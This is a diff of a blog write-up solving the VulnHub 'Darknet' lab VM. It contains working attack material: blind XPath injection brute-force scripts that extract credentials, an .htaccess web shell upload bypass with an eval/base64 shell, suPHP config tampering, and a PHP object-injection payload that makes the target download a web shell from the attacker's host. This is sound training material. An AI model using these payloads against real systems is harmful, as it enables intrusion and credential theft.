 <p>Intruder was configured to use a simple fuzzing wordlist sourced from <code>/usr/share/wordlists/wfuzz/Injections/All_attack.txt</code> on Kali Linux from the <code>wordlists</code> package. Once the attack finished running, I went to the results and sorted them by response size. It was possible to quickly see in this case that those that returned an email address in the body and those that didn&rsquo;t based purely on the size. Using this list, I was able to filter out and realize that the payload of <code>count(/child::node())</code> managed to return a valid result for the <code>id</code> parameter.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpath_discovery.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_xpath_discovery.png>
 </figure>
-
 <p>The first time I saw this I had no idea how much time I would be spending on this particular bug. In fact, I have never come across this before so this was <strong>by far</strong> the most educational portion of the challenge for me!</p>
-<h2 id="xpath-injection">xpath injection</h2>
-<p>Just googling the term <em>count(/child::node())</em> quickly revealed that this was something that related to XPath. XPath allows you to query XML datasets much like SQL can query databases. Ok great. Next up was a trip to owasp.org and their article on <a href="https://www.owasp.org/index.php/XPATH_Injection">XPATH Injection</a>. I spent quite a bit of time researching this type of vulnerability. I realized that the case I was dealing with here was blind XPath injection. Much like blind SQL injection, blind XPath injection can also be exploited by running &lsquo;queries&rsquo; that return true/false. The condition for true in this case was the fact that the email address appeared, and false was that it was missing from the response.</p>
-<p>By far, <a href="http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf">this</a> PDF was the most useful in getting me to understand the vulnerability in the most depth.</p>
+<h2 id=xpath-injection>xpath injection</h2>
+<p>Just googling the term <em>count(/child::node())</em> quickly revealed that this was something that related to XPath. XPath allows you to query XML datasets much like SQL can query databases. Ok great. Next up was a trip to owasp.org and their article on <a href=https://www.owasp.org/index.php/XPATH_Injection>XPATH Injection</a>. I spent quite a bit of time researching this type of vulnerability. I realized that the case I was dealing with here was blind XPath injection. Much like blind SQL injection, blind XPath injection can also be exploited by running &lsquo;queries&rsquo; that return true/false. The condition for true in this case was the fact that the email address appeared, and false was that it was missing from the response.</p>
+<p>By far, <a href=http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf>this</a> PDF was the most useful in getting me to understand the vulnerability in the most depth.</p>
 <p>Before I could exploit this bug though, I had to come up with a way to test the theories that I was reading about locally. To do this, I copied some XML that I found in one of the articles to start.</p>
 <pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
 &lt;Employees&gt;
@@ -428,7 +298,7 @@ print PHP_EOL . PHP_EOL;
 // Show the raw result of the XPath not filtered
 print 'Raw:' . PHP_EOL;
 print_r($result);
-</code></pre><p>I studied some XPath functions available on <a href="http://devdocs.io/xslt_xpath-xpath-functions/">devdocs.io</a>. This reference together with what I read online as well as my small test scenario helped me figure that I could make use of the <a href="http://devdocs.io/xslt_xpath/xpath/functions/starts-with">starts-with()</a> XPath function to test for true/false scenarios. This proved to work in my little test environment.</p>
+</code></pre><p>I studied some XPath functions available on <a href=http://devdocs.io/xslt_xpath-xpath-functions/>devdocs.io</a>. This reference together with what I read online as well as my small test scenario helped me figure that I could make use of the <a href=http://devdocs.io/xslt_xpath/xpath/functions/starts-with>starts-with()</a> XPath function to test for true/false scenarios. This proved to work in my little test environment.</p>
 <pre><code>root@kali:~/data/VulnHub/Darknet# php readxml.php &quot;1 and starts-with(name(*[1]),'F')=1&quot;
 Injection    : 1 and starts-with(name(*[1]),'F')=1
 Xpath        : //Employee[@ID=1 and starts-with(name(*[1]),'F')=1]/UserName
@@ -447,9 +317,9 @@ Array
 )
 </code></pre><p>To test this scenario on Darknet, I took a guess at the node name of the field that is being returned as <code>email</code> considering its an email address that is being returned. It is possible to brute force these names as you will see later.
 To start testing the feasibility of the blind boolean based injection, I entered the payload <code>1 and starts-with(email, 'e')</code> into the URL.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpath_booltest.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_xpath_booltest.png>
 </figure>
-
 <p>Boom. The email address is returned! This meant that I could run over a large key space and brute force other parts of the underlying XML, hoping to learn more of its structure. For clarities sake, the <code>starts-with()</code> function will later be expanded to be something like <code>1 and starts-with(email, 'errorlevel')</code>. Using the payload <code>2 and starts-with(email, 'd')</code> will also return the <code>devnull@darknet.com</code> email address as that email starts with <code>d</code> which makes the XPath query true.</p>
 <p>I was not going to test all of these characters by hand, nope. I had to figure out what this XML looks like, so I wrote some scripts to help with that. The first script attempts to brute force the names of the current node as well as the parent node. If we have these names we can call them in an XPath query by name. For eg, <code>//parent/current/attribute</code>.</p>
 <pre><code>import requests
@@ -492,7 +362,6 @@ for payload_type, payload in payloads.iteritems():
 
 print &quot;\nDone&quot;
 </code></pre><p>The script in action, determining that the XML has the structure <code>//auth/user</code>:</p>
-<!-- raw HTML omitted -->
 <p>I was now able to theorize that the XML may have the following structure when calling user information. <code>//auth/user[@id=1]/email</code> where <code>1</code> is the ID of the user in question. I knew about the <code>email</code> field as it was <em>almost</em> obvious. I also discovered the <code>username</code> field by guessing. I tried to apply the same brute force logic as I did to the values, but for some reason I was not getting any luck with payloads where I was trying to address attributes by position, such as with <code>[*1]</code> for the first. This did work in my local test environment but not on Darknet. I had everything I needed to get the credentials for login (I think?), but did not have the passwords.</p>
 <p>Eventually I wrote another script to take some words from a wordlist and brute the attribute names, hoping to discover some more attributes!</p>
 <pre><code>import requests
@@ -510,30 +379,28 @@ with open('/usr/share/wfuzz/wordlist/general/spanish.txt') as f:
             print 'Found attribute: {word}'.format(word=word)
 
 </code></pre><p>Having noticed a large part of the sites have been in Spanish, I eventually used a Spanish wordlist and found the field name <code>clave</code> with it. Urgh, that was mildly frustrating. Anyways, this script in action:</p>
-<!-- raw HTML omitted -->
-<p>Finally. <code>username</code> &amp; <code>clave</code>! As the final piece to this puzzle, I took the original script used to brute force the XML structure and modified the payloads to now brute the values for <code>username</code> and <code>clave</code>! The new payloads were:</p>
+<p>Finally. <code>username</code> & <code>clave</code>! As the final piece to this puzzle, I took the original script used to brute force the XML structure and modified the payloads to now brute the values for <code>username</code> and <code>clave</code>! The new payloads were:</p>
 <pre><code>'username': '1 and starts-with((//auth/user[id=1]/username),&quot;{exfil}&quot;)=1',
 'password': '1 and starts-with((//auth/user[id=1]/clave),&quot;{exfil}&quot;)=1',
 </code></pre><p>The brute force script in action with the new payloads:</p>
-<!-- raw HTML omitted -->
-<p>So the username and password combination that lets you login at <a href="http://signal8.darknet.com/xpanel/">http://signal8.darknet.com/xpanel/</a> is <code>errorlevel</code> / <code>tc65Igkq6DF</code>.</p>
-<h1 id="the-ploy">the ploy</h1>
+<p>So the username and password combination that lets you login at <a href=http://signal8.darknet.com/xpanel/>http://signal8.darknet.com/xpanel/</a> is <code>errorlevel</code> / <code>tc65Igkq6DF</code>.</p>
+<h1 id=the-ploy>the ploy</h1>
 <p>Once you have logged in, you presented with a page with a login to <em>Editor PHP</em>.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpanel_loggedin.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_xpanel_loggedin.png>
 </figure>
-
 <p>The link to <code>edit.php</code> had little value as it simply appeared to be a &lsquo;troll&rsquo; page. I guess the humor here is the fact that code/os command execution has been relatively painful and this may have been a sign of hope.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpanel_troll_edit.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_xpanel_troll_edit.png>
 </figure>
-
 <p>When I viewed the page sources for the page I got when I just logged it, I saw a hint to a <code>ploy.php</code> page.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpanel_ploy.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_xpanel_ploy.png>
 </figure>
-
 <p>Browsing to <code>ploy.php</code>, I was met with a file upload and a series of checkboxes to tick.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpanel_ploy_upload.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_xpanel_ploy_upload.png>
 </figure>
-
 <p>It very quickly became obvious that you have to select the right combination of checkboxes in order to be allowed to upload anything. Each checkbox had a numeric value, so I copied this out into a script and proceeded to try all of the combinations possible. I knew a combination was correct if the Spanish term <em>Key incorrecta!</em> was not in the response. With some manual fiddling, I also learnt that the key was 4 integers long. Attempting a combination with more or less than 4 keys meant that the HTTP response had <em>La longitud de la clave no es la correcta!</em></p>
 <pre><code>import requests
 import itertools
@@ -572,13 +439,12 @@ for c in itertools.permutations(VALUES, 4):
         break
 
 </code></pre><p>Seeing this script in action would look as follows:</p>
-<!-- raw HTML omitted -->
 <p>So the pin code was <code>37, 10, 59, 17</code>. Easy.</p>
 <p>The next obvious step was to try and figure out how we can weaponize this file upload, if at all. The file upload appeared to accept most uploads except for those ending in .php. Uploading a PHP script would return the error <em>Formato invalido!</em> Things like images (or almost anything that was not useful) responded with <em>Subida exitosa!</em></p>
 <p>I managed to discover a <code>uploads/</code> directory with <code>gobuster</code> again that helped me locate the uploaded files that I was uploading. The filenames appeared to remain intact which made things a little easier. But, this did not help me. I really hoped for some code execution.</p>
 <p><em>fast forward even more hours</em></p>
-<p>Eventually, I came across some PHP file upload bypass techniques that involve <code>.htaccess</code> files. The premise being that if its possible to write/overwrite a folders <code>.htaccess</code>, then it may be possible to <a href="http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html">add a tiny backdoor shell</a> to a folder. Sneaky! The only real requirement was that the VirtualHost configuration had to allow for <code>.htaccess</code> files to be read. As I had already downloaded the configuration file for signal8.darknet.com, I could quickly see that <code>AllowOverride</code> was set to <code>All</code>. Fantastic!</p>
-<p>I picked a shell from the <a href="https://github.com/wireghoul/htshells">https://github.com/wireghoul/htshells</a> repository <a href="https://github.com/wireghoul/htshells/blob/master/shell/mod_php.shell.htaccess">here</a>. From my previous testing, I wrote a small uploader so that I wouldn&rsquo;t have to click those checkboxes all the time.</p>
+<p>Eventually, I came across some PHP file upload bypass techniques that involve <code>.htaccess</code> files. The premise being that if its possible to write/overwrite a folders <code>.htaccess</code>, then it may be possible to <a href=http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html>add a tiny backdoor shell</a> to a folder. Sneaky! The only real requirement was that the VirtualHost configuration had to allow for <code>.htaccess</code> files to be read. As I had already downloaded the configuration file for signal8.darknet.com, I could quickly see that <code>AllowOverride</code> was set to <code>All</code>. Fantastic!</p>
+<p>I picked a shell from the <a href=https://github.com/wireghoul/htshells>https://github.com/wireghoul/htshells</a> repository <a href=https://github.com/wireghoul/htshells/blob/master/shell/mod_php.shell.htaccess>here</a>. From my previous testing, I wrote a small uploader so that I wouldn&rsquo;t have to click those checkboxes all the time.</p>
 <pre><code>import requests
 import sys
 import os.path as path
@@ -618,10 +484,10 @@ else:
 [+] Uploading : .htaccess
 [+] Upload successful! Try: http://signal8.darknet.com/xpanel/uploads/.htaccess
 </code></pre><p>Once uploaded, I browsed to the location and was met with what looks like some code execution again!</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpanel_shell.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_xpanel_shell.png>
 </figure>
-
-<p>As expected, the OS command execution does not work due to all those <code>disable_functions</code>, but we have PHP code execution so that was a start! I decided that for this one I wanted to try get a more fully featured shell working. So, I edited the <code>.htaccess</code> to include a web shell that <a href="https://gist.github.com/leonjza/8e9d16c84cf70014c4f36d8f95f9836e">I was working quite some time ago</a> (and finally kinda finished). I packed the shell and replaced the PHP in the <code>.htaccess</code> with the more fully featured shells packed source.</p>
+<p>As expected, the OS command execution does not work due to all those <code>disable_functions</code>, but we have PHP code execution so that was a start! I decided that for this one I wanted to try get a more fully featured shell working. So, I edited the <code>.htaccess</code> to include a web shell that <a href=https://gist.github.com/leonjza/8e9d16c84cf70014c4f36d8f95f9836e>I was working quite some time ago</a> (and finally kinda finished). I packed the shell and replaced the PHP in the <code>.htaccess</code> with the more fully featured shells packed source.</p>
 <pre><code># &lt;!--  Self contained .htaccess web shell - Part of the htshell project
 # Written by Wireghoul - http://www.justanotherhacker.com
 
@@ -639,23 +505,23 @@ AddType application/x-httpd-php .htaccess
 
 ###### SHELL ###### --&gt;&lt;?php eval(base64_decode(&quot;LONG BASE64 ENCODED STRING&quot;));
 </code></pre><p>Uploaded this with my upload helper and boom, a better shell.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpanel_shell2.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_xpanel_shell2.png>
 </figure>
-
-<h2 id="the-last-hurdles">the last hurdle(s)</h2>
-<p>Wtf. The current user is <code>errorlevel</code>&hellip; I double checked and saw that previously we were the <code>devnull</code> user. This had me pretty confused in the beginning and had me spend quite a bit of time to figure out how this is possible. From the <code>phpinfo()</code> output we had no <code>open_basedir</code> restriction so that allowed me to move around the filesystem much more freely than before. I also noticed that I am not able to access the home directory for the <code>errorlevel</code> user so I couldn&rsquo;t really figure out what was going on in there (the red color indicates read/write is not possible).</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpanel_homedirs.png"/>
+<h2 id=the-last-hurdles>the last hurdle(s)</h2>
+<p>Wtf. The current user is <code>errorlevel</code>&mldr; I double checked and saw that previously we were the <code>devnull</code> user. This had me pretty confused in the beginning and had me spend quite a bit of time to figure out how this is possible. From the <code>phpinfo()</code> output we had no <code>open_basedir</code> restriction so that allowed me to move around the filesystem much more freely than before. I also noticed that I am not able to access the home directory for the <code>errorlevel</code> user so I couldn&rsquo;t really figure out what was going on in there (the red color indicates read/write is not possible).</p>
+<figure class=left>
+<img src=/images/darknet_signal8_xpanel_homedirs.png>
 </figure>
-
-<p>Eventually, I discovered the use of <a href="http://www.suphp.org/">suPHP</a> as a loaded module. This basically means that the PHP script will run as the owner of the file. So with that theory, its sane to assume that because <code>errorlevel</code> owns the PHP files in the users home directory, that is why I am seen as that user too.</p>
+<p>Eventually, I discovered the use of <a href=http://www.suphp.org/>suPHP</a> as a loaded module. This basically means that the PHP script will run as the owner of the file. So with that theory, its sane to assume that because <code>errorlevel</code> owns the PHP files in the users home directory, that is why I am seen as that user too.</p>
 <p>Anyways, some more enumeration later, I discover some more PHP scripts in <code>/var/www</code>. These were owned by <code>root</code>, meaning that if there are any vulnerabilities, I could effectively become root!</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpanel_var_www.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_xpanel_var_www.png>
 </figure>
-
 <p>Due to the fact that these were in <code>/var/www</code>, I could just browse to the IP address of the VM and run these scripts. Calling the <code>sec.php</code> script caused the server to return an HTTP 500 error.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_sec_error.png"/>
+<figure class=left>
+<img src=/images/darknet_sec_error.png>
 </figure>
-
 <p>As I was able to read the files in <code>/var/www</code>, I also downloaded <code>sec.php</code> to get an idea of what its supposed to be doing.</p>
 <pre><code>&lt;?php
 
@@ -707,7 +573,7 @@ class Show {
 }
 
 ?&gt;
-</code></pre><p>A textbook example of <a href="https://www.owasp.org/index.php/PHP_Object_Injection">PHP Object Injection</a>! I continued to serialize an instance of of the <code>Show</code> class by copying the class into a new PHP file, instantiating the <code>Show</code> class and running the <code>serialize()</code> function over it, printing the output.</p>
+</code></pre><p>A textbook example of <a href=https://www.owasp.org/index.php/PHP_Object_Injection>PHP Object Injection</a>! I continued to serialize an instance of of the <code>Show</code> class by copying the class into a new PHP file, instantiating the <code>Show</code> class and running the <code>serialize()</code> function over it, printing the output.</p>
 <pre><code>// Source code for poishow.php
 &lt;?php
 
@@ -740,9 +606,9 @@ r = requests.post('http://192.168.252.140/sec.php', data={'test': OBJECT})
 print r.status_code
 print r.text
 </code></pre><p>Running this made the server still respond with an HTTP 500 error. Hmm. I was stuck here for quite some time trying to figure out if I can get some form of logging somewhere that I can read. At some stage, I came across <code>/etc/suphp</code> and realized that the configuration file for it is writable.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpanel_suphp_writable.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_xpanel_suphp_writable.png>
 </figure>
-
 <p>The <code>suphp.conf</code> file had an entry <code>logfile=/var/log/suphp/suphp.log</code> which I changed to log to <code>/tmp</code>, hoping for it to reveal some information about the error code I was getting. To do this, I downloaded the file, modified the entry, and used my web shell&rsquo;s upload functionality to override the original configuration file. This worked just fine, apart from the fact that that logfile too was not readable by me :(</p>
 <p>Some time later, I realized that there were two more configuration options in the configuration file that are of interest.</p>
 <pre><code>; Minimum UID
@@ -750,10 +616,10 @@ min_uid=100
 
 ; Minimum GID
 min_gid=100
-</code></pre><p>Remember that the PHP scripts we are trying to access are owned by <code>root</code>? Turns out that this is a security feature of <a href="http://www.suphp.org/">suPHP</a> to prevent scripts with too high permissions to run. So, I modify the configuration file again to replace the values with <code>0</code> and upload it to override the original.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpanel_suphp_override.png"/>
+</code></pre><p>Remember that the PHP scripts we are trying to access are owned by <code>root</code>? Turns out that this is a security feature of <a href=http://www.suphp.org/>suPHP</a> to prevent scripts with too high permissions to run. So, I modify the configuration file again to replace the values with <code>0</code> and upload it to override the original.</p>
+<figure class=left>
+<img src=/images/darknet_signal8_xpanel_suphp_override.png>
 </figure>
-
 <p>This time, when I try and access the <code>sec.php</code> script, I am provided with no output. Great! Back to the original Object Injection that I was trying to exploit, I rerun my python script to test the <code>unserialize()</code>.</p>
 <pre><code>root@kali:~/data/VulnHub/Darknet# python phpObjectInjection.py
 [+] Exploiting the PHP Object Injection Bug
@@ -809,12 +675,12 @@ a:2:{i:0;O:4:&quot;Test&quot;:3:{s:3:&quot;url&quot;;s:35:&quot;http://192.168.2
 </code></pre><p>The only thing that is left to do is host the <code>shell.txt</code> file at the location specified in the <code>$url</code> property and run the little python helper with the new serialized string. I started up a HTTP server with <code>python -m SimpleHTTPServer</code> and wrote my web shell to <code>shell.txt</code>. The python helper was changed so that <code>OBJECT</code> had the new serialized string.</p>
 <pre><code>OBJECT = &quot;&quot;&quot;a:2:{i:0;O:4:&quot;Test&quot;:3:{s:3:&quot;url&quot;;s:35:&quot;http://192.168.252.1:8000/shell.txt&quot;;s:9:&quot;name_file&quot;;s:7:&quot;pop.php&quot;;s:4:&quot;path&quot;;s:8:&quot;/var/www&quot;;}i:1;O:4:&quot;Show&quot;:1:{s:4:&quot;woot&quot;;N;}}&quot;&quot;&quot;
 </code></pre><p>I ran the helper and saw that the <code>shell.txt</code> was downloaded from my web server. I could now browse to http://192.168.252.140/pop.php :D</p>
-<h2 id="flag">flag</h2>
+<h2 id=flag>flag</h2>
 <p>Using the shell uploaded, I was finally able to cat the flag!</p>
-<figure><img src="https://leonjza.github.io/images/darknet_flag.png"/>
+<figure class=left>
+<img src=/images/darknet_flag.png>
 </figure>
-
-<h2 id="final-thoughts">final thoughts</h2>
+<h2 id=final-thoughts>final thoughts</h2>
 <p>I went back to a few of the source files to get an idea for whats going on once the box was rooted. The first being the weirdness when I tried to brute force the first elements of the node in the XPath injection. Turns out, a <code>preg_match()</code> was applied to filter out a few inputs.</p>
 <pre><code>if(!empty($_GET['id'])){
     $id=$_GET['id'];
@@ -825,180 +691,38 @@ a:2:{i:0;O:4:&quot;Test&quot;:3:{s:3:&quot;url&quot;;s:35:&quot;http://192.168.2
 <pre><code>if(preg_match(&quot;/select|and|[&gt;,=&lt;\-;]/&quot;, $user)){
     echo &quot;Ilegal&quot;;
     exit();
-</code></pre><p>In the end, I learnt a lot! Thanks <a href="https://twitter.com/Q3rv0">@Q3rv0</a></p>
-    </div>
-  </article>
-
-  
-  
-
-
-
-
-  
-    <div class="blog-post-comments">
-        <div id="disqus_thread">
-          <script type="text/javascript">
-          
-          (function() {
-              
-              
-              
-              
-          
-              var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-              var disqus_shortname = 'slashnote';
-              dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-          })();
-          </script>
-          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-          <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-        </div>
-    </div>
-
-  
-
-
-  <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-          <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-          <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-          <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#getting-started">getting started</a></li>
-    <li><a href="#888darknetcom">888.darknet.com</a></li>
-    <li><a href="#888-authentication-bypass">888 authentication bypass</a></li>
-    <li><a href="#administrator-sql-shell">administrator sql shell</a></li>
-    <li><a href="#signal8-so-much-hate">signal8. so much hate.</a></li>
-    <li><a href="#xpath-injection">xpath injection</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#the-last-hurdles">the last hurdle(s)</a></li>
-    <li><a href="#flag">flag</a></li>
-    <li><a href="#final-thoughts">final thoughts</a></li>
-  </ul>
-</nav>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      
-      <ul>
-  
-  
-    
-  
-  
-  <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f" aria-label="Facebook">
-      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&text=rooting%20darknet" aria-label="Twitter">
-      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&title=rooting%20darknet" aria-label="Linkedin">
-      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&is_video=false&description=rooting%20darknet" aria-label="Pinterest">
-      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="mailto:?subject=rooting%20darknet&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f" aria-label="Email">
-      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&title=rooting%20darknet" aria-label="Pocket">
-      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&title=rooting%20darknet" aria-label="reddit">
-      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&name=rooting%20darknet&description=%3cp%3eIts%20been%20a%20while%20since%20I%20have%20done%20a%20vulnerable%20boot2root%20from%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fvulnhub%22%3e%40VulnHub%3c%2fa%3e.%20So%2c%20I%20decided%20to%20pick%20up%20where%20I%20last%20left.%20After%20paging%20back%20from%20the%20latest%20VM%26rsquo%3bs%20to%20where%20I%20roughly%20stopped%20last%20year%2c%20my%20attention%20was%20drawn%20to%20%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2fentry%2fdarknet-10%2c120%2f%22%3eDarknet%3c%2fa%3e%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fQ3rv0%22%3e%40Q3rv0%3c%2fa%3e.%3c%2fp%3e%0a%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fdarknet_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eThis%20is%20how%20I%20managed%20to%20solve%20a%20VM%20that%20totally%20kicked%20my%20ass%21%20While%20I%20was%20solving%20this%20VM%2c%20I%20also%20tried%20out%20a%20Kali%20Docker%20image%21%20This%20actually%20worked%20out%20great.%3c%2fp%3e" aria-label="Tumblr">
-      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&t=rooting%20darknet" aria-label="Hacker News">
-      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-      
-        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
-          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
-          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
-          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
-          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+</code></pre><p>In the end, I learnt a lot! Thanks <a href=https://twitter.com/Q3rv0>@Q3rv0</a></p>
 </div>
-
-
-  <footer id="footer">
-  <div class="footer-left">
-    Copyright  &copy; 2021  Leon Jacobs 
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-        <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </nav>
-  </div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=https://leonjza.github.io/blog/2016/07/09/awesome-nmap-grep/>
+<span class=button__icon>←</span>
+<span class=button__text>awesome nmap grep</span>
+</a>
+</span>
+<span class="button next">
+<a href=https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/>
+<span class=button__text>kerberos, kerberoast and golden tickets</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
+</div>
 </footer>
-
-
-  </div>
+<script src=https://leonjza.github.io/assets/main.js></script>
+<script src=https://leonjza.github.io/assets/prism.js></script>
+</div>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
 </body>
-
-<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
-<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
-<script src=https://leonjza.github.io/js/main.js></script>
-<script src=https://leonjza.github.io/js/code-copy.js></script>
-
-
-
 </html>
